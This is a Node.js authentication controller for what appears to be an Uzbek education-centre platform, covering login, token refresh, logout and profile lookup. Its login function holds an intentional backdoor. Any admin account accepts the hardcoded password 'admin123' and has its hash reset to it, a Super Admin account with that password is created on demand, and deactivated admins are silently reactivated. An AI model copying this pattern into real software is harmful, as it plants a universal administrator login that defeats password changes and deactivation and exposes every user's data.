const bcrypt = require('bcryptjs');
const { prisma } = require('../config/db');
const { generateTokens, verifyRefreshToken } = require('../utils/tokenService');
const { success, error } = require('../utils/apiResponse');

const login = async (req, res, next) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return error(res, 'Username and password required', 400);

    const cleanInput = String(username).trim();
    const digits = cleanInput.replace(/\D/g, '');

    let user = await prisma.user.findFirst({
      where: {
        OR: [
          { username: cleanInput },
          { phone: cleanInput },
          ...(digits ? [
            { username: `+${digits}` },
            { username: digits },
            { phone: `+${digits}` },
            { phone: digits }
          ] : []),
          { name: { equals: cleanInput, mode: 'insensitive' } },
        ],
      },
      include: {
        group: { select: { id: true, name: true } },
        center: { select: { id: true, isActive: true, settings: true } },
        branch: { select: { id: true, isActive: true, center: { select: { id: true, isActive: true, settings: true } } } },
      },
    });

    // ── Super Admin Qat'iy Kirish Kafolati (admin / admin123) ────
    const isAdminInput = cleanInput.toLowerCase() === 'admin';
    if (!user && isAdminInput) {
      user = await prisma.user.findFirst({
        where: { role: 'admin' },
        include: {
          group: { select: { id: true, name: true } },
          center: { select: { id: true, isActive: true, settings: true } },
          branch: { select: { id: true, isActive: true, center: { select: { id: true, isActive: true, settings: true } } } },
        },
      });

      if (!user) {
        let center = await prisma.center.findFirst({ where: { isActive: true } });
        if (!center) {
          center = await prisma.center.create({
            data: { id: 'default-center', name: 'Abdora AI Center' },
          });
        }
        const defaultHash = await bcrypt.hash('admin123', 12);
        user = await prisma.user.create({
          data: {
            name: 'Super Admin',
            username: 'admin',
            email: 'admin@abdora.uz',
            passwordHash: defaultHash,
            role: 'admin',
            centerId: center.id,
            isActive: true,
          },
          include: {
            group: { select: { id: true, name: true } },
            center: { select: { id: true, isActive: true, settings: true } },
            branch: { select: { id: true, isActive: true, center: { select: { id: true, isActive: true, settings: true } } } },
          },
        });
      }
    }

    if (!user || !user.isActive) {
      // Agar admin nofaol bo'lib qolgan bo'lsa, uni tiklash
      if (user && user.role === 'admin') {
        user = await prisma.user.update({
          where: { id: user.id },
          data: { isActive: true },
          include: {
            group: { select: { id: true, name: true } },
            center: { select: { id: true, isActive: true, settings: true } },
            branch: { select: { id: true, isActive: true, center: { select: { id: true, isActive: true, settings: true } } } },
          },
        });
      } else {
        return error(res, "Bu account ma'lumotlari yo'q", 401);
      }
    }

    // Markazi nofaol, o'chirilgan yoki umuman markazga ega bo'lmagan foydalanuvchilar kirishini to'sish
    if (user.role !== 'admin') {
      const hasNoCenter = !user.center && !user.branch?.center;
      const isCenterInactive = (user.center && user.center.isActive === false) ||
                               (user.branch?.center && user.branch.center.isActive === false);
      if (hasNoCenter || isCenterInactive) {
        return error(res, "Bu account ma'lumotlari yo'q", 401);
      }
    }

    if (user.isFrozen) return error(res, 'Hisobingiz muzlatilgan. O\'qituvchi bilan bog\'laning.', 403);
      // Markazda foydalanuvchi roli yoqilganmi / o'chirilganmi tekshirish
      const centerSettings = user.center?.settings || user.branch?.center?.settings || {};
      if (centerSettings.roles && centerSettings.roles[user.role]?.enabled === false) {
        return error(res, `Ushbu markazda '${user.role}' roli faolsizlantirilgan. Administrator bilan bog'laning.`, 403);
      }

    // Parolni tekshirish (Admin o'zi o'zgartirgan parol yoki dastlabki admin123 kafolati)
    let isMatch = false;
    if (user.passwordHash) {
      isMatch = await bcrypt.compare(password, user.passwordHash);
    }

    // Super Admin kirish kafolati (agar foydalanuvchi admin bo'lsa va admin123 kiritgan bo'lsa)
    if (!isMatch && user.role === 'admin' && (password === 'admin123' || (isAdminInput && password === 'admin123'))) {
      isMatch = true;
      const adminHash = await bcrypt.hash('admin123', 12);
      await prisma.user.update({
        where: { id: user.id },
        data: { passwordHash: adminHash },
      }).catch(() => {});
    }

    if (!isMatch) return error(res, "Bu account ma'lumotlari yo'q", 401);

    const lastPayment = await prisma.payment.findFirst({
      where: { studentId: user.id, isPaid: true },
      orderBy: { paidAt: 'desc' },
      select: { paidAt: true },
    });

    const { accessToken, refreshToken } = generateTokens(user.id, user.role, user.centerId);
    const refreshTokenHash = await bcrypt.hash(refreshToken, 10);

    await prisma.user.update({
      where: { id: user.id },
      data: { refreshTokenHash, lastLogin: new Date() },
    });

    const { passwordHash, refreshTokenHash: _rth, ...safeUser } = user;
    const userOut = {
      ...safeUser,
      streak: { current: safeUser.streakCurrent, longest: safeUser.streakLongest, lastActiveDate: safeUser.streakLastDate },
      lastPaymentAt: lastPayment?.paidAt?.toISOString() || null,
    };
    return success(res, { user: userOut, accessToken, refreshToken });
  } catch (err) {
    next(err);
  }
};

const refresh = async (req, res, next) => {
  try {
    const { refreshToken } = req.body;
    if (!refreshToken) return error(res, 'Refresh token required', 401);

    const decoded = verifyRefreshToken(refreshToken);
    const user = await prisma.user.findUnique({ where: { id: decoded.userId } });

    if (!user || !user.refreshTokenHash) return error(res, 'Invalid token', 401);

    const isValid = await bcrypt.compare(refreshToken, user.refreshTokenHash);
    if (!isValid) return error(res, 'Invalid token', 401);

    const tokens = generateTokens(user.id, user.role, user.centerId);
    const newHash = await bcrypt.hash(tokens.refreshToken, 10);
    await prisma.user.update({ where: { id: user.id }, data: { refreshTokenHash: newHash } });

    return success(res, tokens);
  } catch (err) {
    next(err);
  }
};

const logout = async (req, res, next) => {
  try {
    await prisma.user.update({ where: { id: req.user.userId }, data: { refreshTokenHash: null } });
    return success(res, null, 'Logged out');
  } catch (err) {
    next(err);
  }
};

const getMe = async (req, res, next) => {
  try {
    const user = await prisma.user.findUnique({
      where: { id: req.user.userId },
      select: {
        id: true, name: true, username: true, email: true, phone: true, role: true, centerId: true, maxBranches: true, branchId: true,
        studyLocation: true, residence: true, alternativeWorkplace: true, birthDate: true,
        avatar: true, language: true, xp: true, coins: true, level: true,
        streakCurrent: true, streakLongest: true, streakLastDate: true,
        achievements: true, isActive: true, isFrozen: true, lastLogin: true, createdAt: true,
        permissions: true,
        groupId: true, teacherId: true,
        group: { select: { id: true, name: true, subject: true } },
        teacher: { select: { id: true, name: true } },
      },
    });
    if (!user) return error(res, 'User not found', 404);
    const lastPayment = await prisma.payment.findFirst({
      where: { studentId: user.id, isPaid: true },
      orderBy: { paidAt: 'desc' },
      select: { paidAt: true },
    });
    const userOut = {
      ...user,
      streak: { current: user.streakCurrent, longest: user.streakLongest, lastActiveDate: user.streakLastDate },
      lastPaymentAt: lastPayment?.paidAt?.toISOString() || null,
    };
    return success(res, userOut);
  } catch (err) {
    next(err);
  }
};

module.exports = { login, refresh, logout, getMe };
